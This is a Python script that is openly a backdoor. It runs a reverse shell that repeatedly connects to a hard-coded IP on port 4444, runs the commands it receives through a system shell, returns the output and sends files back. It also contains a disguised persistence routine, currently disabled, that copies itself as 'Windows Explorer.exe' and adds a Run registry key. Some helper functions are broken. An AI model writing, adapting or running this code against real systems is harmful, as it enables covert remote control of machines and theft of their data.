#!/usr/bin/env python

import socket
import os
import shutil
import subprocess
import sys
import base64


class Backdoor:
    def __init__(self, host, listener):

        self.conn = socket.socket(
            socket.AF_INET,     # IPv4
            socket.SOCK_STREAM, # TCP socket
        )
             
        self.host, self.listener = host,listener
        
    
    def run(self):
        
        while True:
            sys.stdout.write('\x1b[2K')
            sys.stdout.write(f'\r[*] Waiting for connection ...')
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
                    conn.connect(( self.host, 4444) )
                    sys.stdout.write(f'\r[*] Connected to { self.host } ...')

                    while True:
                    
                        data = conn.recv(1024)

                        if data == b'':
                            conn.close()
                            break
                        data = data.decode().rstrip()
                        try:
                            result = self.execute_command(data)
                        except Exception as e:
                            result = bytes(str(e), encoding='utf8')
                            print(e)
                        conn.send(result)
                        data = result = None
            except Exception:
                pass
    def become_persistent(self):
        return None

        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(src = sys.executable, dst = location)
            subprocess.call(
                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {location}',
                shell = True,
            )

    def download_file(self, path):
        with open(path, 'rb') as fd:
            return fd.read()

    def load_file(self, path, content):
        with open(path, 'rb') as fd:
            return fd.write(content)


    def download_img(self, path):
        with open(path, 'rb') as fd:
            return base64.encode( fd.read() )

    def load_img(self, path, content):
        with open(path, 'rb') as fd:
            return base64.decode( fd.write(content) )


    def execute_command(self, command):
        """
        Only support easy input, and cd command when first argument, 
        just to implement this function faster
        """
        split_pipeline = command.split("|")
        split_command = split_pipeline[0].split(" ")

        if split_command[0] == 'cd':
            os.chdir(split_command[1])
            return subprocess.check_output(['pwd'])

        elif split_command[0] == 'load': 
            return self.load_file(split_command[1])
            
        elif split_command[0] == 'download':
            return self.download_file(split_command[1])

        else:
            return subprocess.check_output(command, shell=True)

    def stop(self):
        self.conn.close()
        sys.stdout.write('\x1b[2K')
        sys.stdout.write(f'[+] Connection stopped')


beautiful_door = Backdoor( '192.168.1.147', 4444 )

while True:
    try:
        beautiful_door.run()
    except Exception as e:
        pass
    
beautiful_door.stop()
